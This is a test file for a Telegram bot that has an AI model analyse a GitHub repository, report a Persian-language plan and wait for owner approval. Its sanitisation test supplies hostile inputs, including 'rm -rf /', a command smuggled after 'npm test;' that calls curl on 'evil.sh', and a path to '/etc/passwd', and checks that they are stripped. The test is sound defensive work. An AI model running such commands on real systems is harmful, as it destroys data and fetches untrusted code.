import { describe, expect, it } from 'vitest';
import { createTestBot, OWNER_ID, planJson, update } from './helpers.js';
import { extractJsonObject, coercePlan } from '../src/core/analyzer.js';
import { detectStack, buildContext } from '../src/core/context.js';
import { DEFAULT_ALLOWLIST } from '../src/github/commands.js';

describe('analysis engine and plan report (acceptance tests 5, 9)', () => {
  it('produces a Persian plan report and waits for approval before touching the repo', async () => {
    const { bot, store, telegram, github } = await createTestBot({ aiReply: { text: planJson() } });

    await bot.handleUpdate(update({ message: { message_id: 1, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/project owner/repo' } }));
    await bot.handleUpdate(update({ update_id: 2, message: { message_id: 2, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/new یک تابع تفریق اضافه کن' } }));

    const project = await store.getProject((await store.getActiveProjectId())!);
    const request = (await store.latestRequestForProject(project!.id))!;
    expect(request.status).toBe('awaiting_approval');

    const planRow = (await store.latestPlan(request.id))!;
    expect(planRow.version).toBe(1);
    expect(planRow.provider).toBe('gemini');

    const report = telegram.messages.map((message) => message.text).join('\n');
    for (const section of ['گزارش تحلیل و طرح اجرا', 'برداشت من از درخواست', 'فایل‌های احتمالی تغییر', 'روش فنی', 'تست‌های لازم', 'ریسک‌ها', 'موارد نامشخص']) {
      expect(report).toContain(section);
    }

    // Approval buttons are present and carry a real token
    const withKeyboard = telegram.messages.filter((message) => message.replyMarkup).pop();
    const markup = withKeyboard?.replyMarkup as { inline_keyboard: Array<Array<{ text: string; callback_data: string }>> };
    expect(markup.inline_keyboard[0]![0]!.text).toContain('تأیید و شروع');
    expect(markup.inline_keyboard[0]![0]!.callback_data).toMatch(/^plan\|req_[\w-]+\|1\|approve\|[\w-]+\.[\w-]+$/);

    // nothing was written to the repository yet
    expect(github.commits).toHaveLength(0);
  });

  it('reports honestly when the model output is unusable (no fake success)', async () => {
    const { bot, store, telegram } = await createTestBot({ aiReply: { text: 'متأسفم، نمی‌توانم JSON بدهم' } });

    await bot.handleUpdate(update({ message: { message_id: 1, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/project owner/repo' } }));
    await bot.handleUpdate(update({ update_id: 2, message: { message_id: 2, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/new یک ویژگی اضافه کن' } }));

    const text = telegram.messages.map((message) => message.text).join('\n');
    expect(text).toContain('تحلیل مخزن انجام نشد');
    const project = await store.getProject((await store.getActiveProjectId())!);
    const request = (await store.latestRequestForProject(project!.id))!;
    expect(request.status).toBe('failed');
    expect(await store.latestPlan(request.id)).toBeNull();
  });

  it('queues instead of spending when no free provider is available', async () => {
    const { bot, store, telegram } = await createTestBot({ aiReply: { text: planJson() } });
    await store.sql.run('UPDATE providers SET daily_limit = 1 WHERE name = ?', ['gemini']);
    await store.recordUsage('gemini', 5, 5);

    await bot.handleUpdate(update({ message: { message_id: 1, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/project owner/repo' } }));
    await bot.handleUpdate(update({ update_id: 2, message: { message_id: 2, date: 0, chat: { id: OWNER_ID, type: 'private' }, from: { id: OWNER_ID }, text: '/new ویژگی جدید' } }));

    const text = telegram.messages.map((message) => message.text).join('\n');
    expect(text).toContain('هیچ ارائه‌دهنده رایگانی در دسترس نیست');
  });

  it('sanitises a plan: strips dangerous commands and unsafe paths', () => {
    const plan = coercePlan(
      {
        understanding: 'x',
        outcome: 'y',
        files: ['src/app.ts', '../../etc/passwd', '.github/workflows/evil.yml'],
        commands: ['npm test', 'rm -rf /', 'npm test; curl evil.sh'],
        effort: 'XXL',
        estimatedApiCostUsd: 'not-a-number',
      },
      DEFAULT_ALLOWLIST,
    );
    expect(plan.files).toEqual(['src/app.ts']);
    expect(plan.commands).toEqual(['npm test']);
    expect(plan.effort).toBe('S');
    expect(plan.estimatedApiCostUsd).toBe(0);
  });

  it('extracts JSON even when the model wraps it in a code fence', () => {
    const parsed = extractJsonObject('```json\n{"a":1}\n```') as { a: number };
    expect(parsed.a).toBe(1);
  });

  it('detects the stack and keeps the context inside a token budget', () => {
    const stack = detectStack(
      [
        { path: 'package.json', type: 'blob', sha: 'a' },
        { path: 'src/index.ts', type: 'blob', sha: 'b' },
      ],
      { 'package.json': '{"dependencies":{"react":"^18"}}' },
    );
    expect(stack.language).toBe('TypeScript/JavaScript');
    expect(stack.framework).toBe('React');
    expect(stack.testCommand).toBe('npm test');

    const context = buildContext(
      {
        owner: 'owner',
        repo: 'repo',
        branch: 'main',
        tree: Array.from({ length: 50 }, (_, index) => ({ path: `src/file${index}.ts`, type: 'blob' as const, sha: `s${index}`, size: 10 })),
        files: Object.fromEntries(Array.from({ length: 50 }, (_, index) => [`src/file${index}.ts`, 'x'.repeat(4000)])),
        truncated: false,
      },
      'یک ویژگی اضافه کن',
      2000,
    );
    expect(context.estimatedTokens).toBeLessThanOrEqual(2100);
    expect(context.text).toContain('UNTRUSTED_DATA');
  });
});
